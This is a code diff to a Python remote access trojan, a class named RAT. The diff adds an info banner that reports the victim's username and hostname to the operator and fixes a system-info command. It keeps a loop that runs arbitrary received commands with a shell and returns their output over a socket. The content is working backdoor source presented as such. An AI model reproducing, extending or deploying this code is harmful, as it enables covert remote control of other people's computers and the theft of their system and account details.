@@ -109,6 +109,7 @@ import os
 import sys
 import time
 import socket
+import getpass
 import subprocess
 
 
@@ -118,6 +119,7 @@ class RAT:
 	_sock = None
 	_port = None
 	_loop = None
+	_info = None
 
 	BUFFER = 1024
 	SHORT_INTERVAL = 0.1
@@ -142,8 +144,17 @@ class RAT:
 		# set loopback address
 		cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
 		# set new port
-		cls._port = 4434	
+		cls._port = 4434
+		cls._info = cls.build_info()
 
+
+	# get fisrt time interaction info
+	def build_info(cls):
+		str1 = "\n[+] USER: "
+		str2 = "\n[+] HOSTNAME: "
+		com1 = "\n\n<!> get more info using 'sys_info' command"
+		com2 = "\n<!> to Disconnect: press Enter and then Ctrl+C\n"
+		return "{}{}{}{}{}{}".format(str(str1), str(getpass.getuser()), str(str2), str(os.uname()[1]), str(com1), str(com2))
 
 	# send data
 	def send(cls, cmd):
@@ -214,7 +225,7 @@ class RAT:
 
 	# get system info
 	def drill_down(cls):
-		return os.uname()
+		return "\n"+str(os.uname())+"\n"
 
 
 	# start the service
@@ -227,7 +238,7 @@ class RAT:
 				data = cls.receive()
 				if(data == cls.SIG):
 					cls.FLAG = True
-					cls.send("\n" + os.getcwd() + "> ")
+					cls.send(cls._info + os.getcwd() + "> ")
 
 				while(cls.FLAG):
 
@@ -248,15 +259,15 @@ class RAT:
 						stdoutput = download(data[7:])
 					#send system info
 					elif(data.startswith('sys_info')):
-						stdoutput = drill_down()
+						stdoutput = cls.drill_down()
 
 					
-
 					else:
 						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 						stdoutput = proc.stdout.read() + proc.stderr.read()
 
 					# Send data to server
+					
 					stdoutput += "\n" + os.getcwd() + "> "
 					stdoutput = stdoutput.decode('gbk').encode('utf-8')
 					cls.send(stdoutput)
